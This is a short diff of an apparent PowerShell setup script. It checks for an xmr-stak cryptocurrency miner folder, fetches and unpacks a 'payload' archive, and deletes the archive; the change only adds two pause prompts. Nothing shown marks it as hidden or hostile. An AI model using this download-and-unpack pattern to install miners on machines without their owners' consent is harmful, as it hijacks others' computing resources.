@@ -142,9 +142,11 @@ if (!(Test-Path "$opsDir\xmr-stak-win64-2.8.3"))
   payload $payloadDestination
   Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDir
   Remove-Item $payloadDestination -Force
+  read-host
 
 } else { write-host "`nPayload exists..."
       Start-Sleep -s 1
+      read-host
 }
 
 
